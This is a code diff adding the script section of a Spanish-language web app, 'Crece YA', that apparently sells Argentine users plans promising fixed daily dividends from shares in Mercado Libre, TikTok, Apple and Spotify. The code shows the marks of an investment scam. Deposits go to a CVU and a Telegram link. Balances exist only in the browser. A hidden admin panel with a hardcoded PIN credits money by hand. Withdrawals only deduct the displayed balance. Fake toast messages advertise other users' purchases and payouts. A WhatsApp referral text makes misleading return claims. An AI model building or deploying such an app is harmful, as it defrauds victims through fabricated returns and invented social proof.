+            <span class="text-[10px] font-mono font-bold px-2 py-0.5 rounded-md text-white" style="background-color: ${p.color}">
+              ${p.days} Días
+            </span>
+          </div>
+
+          <div class="grid grid-cols-2 gap-2 text-[11px] font-mono bg-slate-50 p-2 rounded-xl border border-slate-100">
+            <div>
+              <span class="text-slate-400 block text-[9px]">DIVIDENDO DIARIO</span>
+              <strong class="text-sky-700 font-bold">+$${fmt(p.daily)} ARS/d</strong>
+            </div>
+            <div>
+              <span class="text-slate-400 block text-[9px]">TOTAL AL CIERRE</span>
+              <strong class="text-slate-900 font-bold">$${fmt(p.total)} ARS</strong>
+            </div>
+          </div>
+
+          <div class="flex justify-between text-[10px] text-slate-400 font-mono pt-0.5">
+            <span>Quedan ${p.slotsLeft} de ${p.slotsTotal} cupos</span>
+            <span class="text-sky-600 font-bold">Ronda 1</span>
+          </div>
+
+          <button onclick="handlePlanClick('${p.id}')" class="w-full py-2.5 ${p.btnBg} font-extrabold text-xs rounded-xl transition shadow flex items-center justify-center gap-1">
+            ${btnLabel}
+          </button>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    // --- ACCIÓN DE ADQUIRIR / ACTIVAR ---
+    window.handlePlanClick = function(planId) {
+      const p = plans.find(item => item.id === planId);
+      if (!p) return;
+
+      if (appState.balance >= p.cost) {
+        if (confirm(`¿Confirmas activar ${p.name} descontando $${fmt(p.cost)} ARS de tu saldo disponible?`)) {
+          appState.balance -= p.cost;
+          const newContract = {
+            id: 'ORD-' + Date.now(),
+            planId: p.id,
+            name: p.name,
+            cost: p.cost,
+            daily: p.daily,
+            total: p.total,
+            days: p.days,
+            startTime: Date.now(),
+            endTime: Date.now() + (p.days * 24 * 60 * 60 * 1000)
+          };
+          appState.activePlans.push(newContract);
+          appState.txs.unshift({
+            desc: `Activación ${p.name}`,
+            amount: -p.cost,
+            date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+          });
+          saveState();
+          alert(`¡Plan ${p.name} activado con éxito! Pasa a la pestaña "Productos" para monitorear el conteo.`);
+          switchTab('productos');
+        }
+      } else {
+        openDepositModal();
+      }
+    };
+
+    // --- RENDERIZADO DE PRODUCTOS (CONTEO REGRESIVO EN VIVO) ---
+    function renderProducts() {
+      const container = document.getElementById('active-products-container');
+      container.innerHTML = '';
+
+      if (appState.activePlans.length === 0) {
+        container.innerHTML = `
+          <div class="p-6 bg-white border border-sky-100 rounded-2xl text-center space-y-2">
+            <i class="fa-solid fa-folder-open text-sky-300 text-3xl"></i>
+            <p class="text-xs text-slate-500 font-medium">No posees contratos bursátiles activos.</p>
+            <button onclick="switchTab('planes')" class="px-4 py-1.5 bg-sky-600 text-white rounded-xl text-xs font-bold shadow">
+              Explorar Mercado
+            </button>
+          </div>
+        `;
+        return;
+      }
+
+      const now = Date.now();
+      appState.activePlans.forEach((plan, index) => {
+        const remaining = plan.endTime - now;
+
+        if (remaining <= 0) {
+          // Contrato culminado: acreditar total
+          appState.balance += plan.total;
+          appState.txs.unshift({
+            desc: `Cierre Contrato ${plan.name}`,
+            amount: plan.total,
+            date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+          });
+          appState.activePlans.splice(index, 1);
+          saveState();
+          alert(`¡Felicitaciones! Culminó el ciclo de ${plan.name}. Se acreditaron $${fmt(plan.total)} ARS a tu balance.`);
+          return;
+        }
+
+        const h = Math.floor(remaining / (1000 * 60 * 60));
+        const m = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+        const s = Math.floor((remaining % (1000 * 60)) / 1000);
+
+        const card = document.createElement('div');
+        card.className = "p-3.5 bg-white border border-sky-200 rounded-2xl shadow-xs space-y-2";
+        card.innerHTML = `
+          <div class="flex justify-between items-center">
+            <h4 class="font-bold text-xs text-slate-900">${plan.name}</h4>
+            <span class="text-[10px] font-mono text-emerald-700 bg-emerald-50 border border-emerald-200 px-2 py-0.5 rounded-md font-bold">
+              En Operación
+            </span>
+          </div>
+          <div class="grid grid-cols-2 gap-2 text-[11px] font-mono bg-slate-50 p-2 rounded-xl border border-slate-100">
+            <div>
+              <span class="text-slate-400 block text-[9px]">INVERSIÓN</span>
+              <strong class="text-slate-800">$${fmt(plan.cost)} ARS</strong>
+            </div>
+            <div>
+              <span class="text-slate-400 block text-[9px]">LIBERACIÓN TOTAL</span>
+              <strong class="text-sky-700 font-bold">$${fmt(plan.total)} ARS</strong>
+            </div>
+          </div>
+          <div class="flex items-center justify-between text-xs pt-1">
+            <span class="text-slate-400 text-[10px] font-mono">Cuenta regresiva:</span>
+            <span class="font-mono font-bold text-sky-800">${h}h ${m}m ${s}s</span>
+          </div>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    setInterval(renderProducts, 1000);
+
+    // --- CHECK-IN DIARIO ($500 ARS) ---
+    document.getElementById('btn-claim-daily').addEventListener('click', () => {
+      const now = Date.now();
+      const oneDay = 24 * 60 * 60 * 1000;
+      if (now - appState.lastClaim < oneDay) {
+        alert("Ya reclamaste tu recompensa diaria de hoy. Espera que termine el contador de 24 hs.");
+        return;
+      }
+      appState.balance += 500;
+      appState.lastClaim = now;
+      appState.txs.unshift({
+        desc: "Bono Check-in Diario",
+        amount: 500,
+        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+      });
+      saveState();
+      alert("¡Se acreditaron +$500 ARS a tu cuenta!");
+    });
+
+    function updateCheckinCooldown() {
+      const now = Date.now();
+      const diff = 24 * 60 * 60 * 1000 - (now - appState.lastClaim);
+      const btn = document.getElementById('btn-claim-daily');
+      const text = document.getElementById('checkin-status-text');
+
+      if (diff > 0) {
+        const h = Math.floor(diff / (1000 * 60 * 60));
+        const m = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
+        const s = Math.floor((diff % (1000 * 60)) / 1000);
+        btn.innerText = "✓ Cobrado";
+        btn.className = "px-3 py-1 bg-slate-200 text-slate-400 text-xs font-bold rounded-xl cursor-not-allowed";
+        text.innerText = `Próximo reclamo en: ${h}h ${m}m ${s}s`;
+      } else {
+        btn.innerText = "Cobrar";
+        btn.className = "px-3.5 py-1.5 bg-amber-400 hover:bg-amber-300 text-slate-950 text-xs font-extrabold rounded-xl transition shadow";
+        text.innerText = "+$500 ARS listos para reclamar";
+      }
+    }
+    setInterval(updateCheckinCooldown, 1000);
+
+    // --- MODAL DE DEPÓSITO Y CVU ---
+    window.openDepositModal = () => document.getElementById('deposit-modal').classList.remove('hidden');
+    window.closeDepositModal = () => document.getElementById('deposit-modal').classList.add('hidden');
+    window.setDepositAmount = (val) => document.getElementById('custom-deposit-amount').value = val;
+
+    document.getElementById('btn-copy-cvu').addEventListener('click', () => {
+      const cvu = document.getElementById('cvu-input-val').value;
+      navigator.clipboard.writeText(cvu).then(() => {
+        const btn = document.getElementById('btn-copy-cvu');
+        btn.innerText = "¡Copiado! ✓";
+        btn.className = "px-2.5 py-1 bg-emerald-500 text-slate-950 text-xs font-bold rounded-lg transition shrink-0";
+        setTimeout(() => {
+          btn.innerText = "Copiar";
+          btn.className = "px-2.5 py-1 bg-sky-600 text-white text-xs font-bold rounded-lg transition shrink-0";
+        }, 1500);
+      });
+    });
+
+    document.getElementById('btn-notify-deposit').addEventListener('click', () => {
+      const amt = parseFloat(document.getElementById('custom-deposit-amount').value) || 2000;
+      if (amt < 2000) {
+        alert("El monto mínimo de depósito es de $2.000 ARS.");
+        return;
+      }
+      appState.pending += amt;
+      saveState();
+      window.open('https://t.me/TuCanalOficial', '_blank');
+      closeDepositModal();
+    });
+
+    // --- MODAL DE RETIRO (MÍNIMO 5.000 ARS, 10% Y 24 HS) ---
+    window.openWithdrawModal = () => document.getElementById('withdraw-modal').classList.remove('hidden');
+    window.closeWithdrawModal = () => document.getElementById('withdraw-modal').classList.add('hidden');
+
+    const withdrawInput = document.getElementById('withdraw-input-amount');
+    withdrawInput.addEventListener('input', () => {
+      const amt = parseFloat(withdrawInput.value) || 0;
+      const net = amt > 0 ? amt * 0.90 : 0;
+      document.getElementById('withdraw-net-display').innerText = `$${fmt(net)} ARS`;
+    });
+
+    document.getElementById('btn-confirm-withdraw').addEventListener('click', () => {
+      const now = Date.now();
+      if (now - appState.lastWithdraw < 24 * 60 * 60 * 1000) {
+        alert("Límite diario alcanzado: Solo se permite 1 solicitud de retiro cada 24 hs.");
+        return;
+      }
+      const amt = parseFloat(withdrawInput.value);
+      if (isNaN(amt) || amt < 5000) {
+        alert("El monto mínimo para solicitar un retiro bancario es de $5.000 ARS.");
+        return;
+      }
+      if (amt > appState.balance) {
+        alert("Saldo insuficiente para solicitar este importe.");
+        return;
+      }
+
+      appState.balance -= amt;
+      appState.lastWithdraw = now;
+      appState.txs.unshift({
+        desc: `Retiro Bancario (Neto: $${fmt(amt * 0.9)})`,
+        amount: -amt,
+        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+      });
+      saveState();
+      alert("Solicitud de retiro registrada en proceso de liquidación.");
+      closeWithdrawModal();
+    });
+
+    // --- COMPARTIR Y REFERIDOS ---
+    const myRefUrl = `${window.location.origin}${window.location.pathname}?ref=11482019`;
+    document.getElementById('ref-link-input').value = myRefUrl;
+
+    document.getElementById('btn-copy-ref').addEventListener('click', () => {
+      navigator.clipboard.writeText(myRefUrl).then(() => {
+        alert("¡Enlace de referidos copiado al portapapeles!");
+      });
+    });
+
+    document.getElementById('btn-share-whatsapp').addEventListener('click', () => {
+      const msg = encodeURIComponent(`¿Alguna vez pensaste en ser dueño de las plataformas que usás todos los días? 📱 Ahora podés con Crece YA: desde solo $2.000 ARS adquirís fracciones de Mercado Libre, TikTok, Apple o Spotify con rendimientos diarios directos en pesos ⚡ Registrate desde mi enlace asegurado y empezá hoy: ${myRefUrl}`);
+      window.open(`https://api.whatsapp.com/send?text=${msg}`, '_blank');
+    });
+
+    // --- PERFIL Y GUARDADO DE DATOS ---
+    document.getElementById('prof-name-input').value = appState.name;
+    document.getElementById('prof-cvu-input').value = appState.cvu;
+    document.getElementById('prof-alias-input').value = appState.alias;
+
+    document.getElementById('btn-save-profile').addEventListener('click', () => {
+      appState.name = document.getElementById('prof-name-input').value.trim();
+      appState.cvu = document.getElementById('prof-cvu-input').value.trim();
+      appState.alias = document.getElementById('prof-alias-input').value.trim();
+      saveState();
+      alert("Datos personales y de cobro guardados correctamente.");
+    });
+
+    // --- PANEL ADMIN SECRETO (4 CLICS EN LOGO / 161928) ---
+    let logoClicks = 0;
+    document.getElementById('admin-logo-trigger').addEventListener('click', () => {
+      logoClicks++;
+      if (logoClicks >= 4) {
+        logoClicks = 0;
+        document.getElementById('admin-modal').classList.remove('hidden');
+      }
+    });
+
+    window.closeAdminModal = () => document.getElementById('admin-modal').classList.add('hidden');
+
+    document.getElementById('btn-admin-unlock').addEventListener('click', () => {
+      const pin = document.getElementById('admin-pin-input').value;
+      if (pin === "161928") {
+        document.getElementById('admin-auth-box').classList.add('hidden');
+        document.getElementById('admin-dashboard-box').classList.remove('hidden');
+      } else {
+        alert("Clave maestra incorrecta.");
+      }
+    });
+
+    document.getElementById('btn-admin-credit').addEventListener('click', () => {
+      const amt = parseFloat(document.getElementById('admin-credit-amount').value) || 0;
+      if (amt <= 0) return;
+      appState.balance += amt;
+      if (appState.pending >= amt) appState.pending -= amt;
+      appState.txs.unshift({
+        desc: "Depósito Aprobado",
+        amount: amt,
+        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+      });
+      saveState();
+      alert(`Se han acreditado $${fmt(amt)} ARS exitosamente.`);
+      closeAdminModal();
+    });
+
+    document.getElementById('btn-admin-validate-guest').addEventListener('click', () => {
+      appState.balance += 1000;
+      appState.invites.push({ phone: "+54 9 11 ... 402", status: "Validado ✓" });
+      appState.txs.unshift({
+        desc: "Recompensa Invitado Oficial",
+        amount: 1000,
+        date: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})
+      });
+      saveState();
+      alert("Invitado validado oficialmente. Se acreditaron +$1.000 ARS.");
+      closeAdminModal();
+    });
+
+    document.getElementById('btn-admin-liquidate-w').addEventListener('click', () => {
+      appState.withdrawn += 5000;
+      saveState();
+      alert("Retiro marcado como transferido y liquidado.");
+      closeAdminModal();
+    });
+
+    document.getElementById('btn-admin-reject-w').addEventListener('click', () => {
+      appState.balance += 5000;
+      saveState();
+      alert("Retiro rechazado. Se reintegraron los fondos al saldo disponible.");
+      closeAdminModal();
+    });
+
+    document.getElementById('btn-logout').addEventListener('click', () => {
+      if (confirm("¿Deseas reiniciar la sesión local?")) {
+        localStorage.clear();
+        location.reload();
+      }
+    });
+
+    // --- SOCIAL PROOF TOAST ---
+    const toasts = [
+      "Usuario +54 9 11... adquirió MELI ($2.000 ARS)",
+      "Usuario +54 9 38... activó TikTok ($3.500 ARS)",
+      "Usuario +54 9 35... activó Spotify ($8.000 ARS)",
+      "Retiro liquidado: $14.500 ARS acreditados a titular validado"
+    ];
+    let toastIndex = 0;
+    setInterval(() => {
+      toastIndex = (toastIndex + 1) % toasts.length;
+      document.getElementById('toast-social-text').innerText = toasts[toastIndex];
+    }, 14000);
+
+    // --- ACTUALIZACIÓN GENERAL DE LA INTERFAZ ---
+    function renderUI() {
+      document.getElementById('home-balance-display').innerHTML = `$${fmt(appState.balance)} <span class="text-xs font-normal text-slate-400">ARS</span>`;
+      document.getElementById('profile-bal-ars').innerText = `$${fmt(appState.balance)}`;
+      document.getElementById('profile-pending-ars').innerText = `$${fmt(appState.pending)}`;
+      document.getElementById('profile-withdrawn-ars').innerText = `$${fmt(appState.withdrawn)}`;
+
+      // Render lista de invitados
+      const invContainer = document.getElementById('invites-list-container');
+      if (appState.invites.length > 0) {
+        invContainer.innerHTML = '';
+        appState.invites.forEach(inv => {
+          invContainer.innerHTML += `
+            <div class="flex justify-between items-center p-2 rounded-xl bg-slate-50 border border-slate-100">
+              <span class="text-slate-700">${inv.phone}</span>
+              <span class="text-emerald-700 bg-emerald-50 px-2 py-0.5 rounded font-bold">${inv.status}</span>
+            </div>
+          `;
+        });
+        document.getElementById('invites-count-badge').innerText = `${appState.invites.length} registrados`;
+      }
+
+      // Render historial de transacciones
+      const txContainer = document.getElementById('tx-history-container');
+      if (appState.txs.length > 0) {
+        txContainer.innerHTML = '';
+        appState.txs.slice(0, 5).forEach(tx => {
+          const isPos = tx.amount > 0;
+          txContainer.innerHTML += `
+            <div class="flex justify-between items-center p-2 bg-slate-50 rounded-xl border border-slate-100">
+              <div>
+                <span class="font-bold text-slate-800 block">${tx.desc}</span>
+                <span class="text-[9px] text-slate-400">${tx.date}</span>
+              </div>
+              <span class="font-bold ${isPos ? 'text-emerald-600' : 'text-slate-800'}">
+                ${isPos ? '+' : ''}$${fmt(tx.amount)} ARS
+              </span>
+            </div>
+          `;
+        });
+      }
+
+      renderPlans();
+    }
+
+    // Inicialización
+    renderUI();
+    renderProducts();
+  </script>
+</body>
+</html>
